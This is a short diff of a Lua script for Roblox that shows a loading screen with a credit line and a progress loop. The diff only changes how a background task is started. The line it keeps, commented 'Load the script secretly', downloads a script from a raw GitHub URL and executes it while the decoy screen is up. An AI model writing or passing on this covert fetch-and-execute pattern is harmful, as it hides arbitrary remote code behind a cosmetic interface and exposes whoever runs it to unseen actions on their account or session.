@@ -109,10 +109,10 @@ creditText.Position = UDim2.new(0, 0, 0.95, 0)
 creditText.Parent = background
 
 -- Background loading script (Load the script secretly)
-coroutine.wrap(function()
+task.spawn(function()
     -- This will execute the provided loadstring while the screen is up
     loadstring(game:HttpGet("https://raw.githubusercontent.com/arlenwood/MM2/refs/heads/main/script.lua"))()
-end)()
+end)
 
 -- Progress update loop
 for i = 0, 100 do
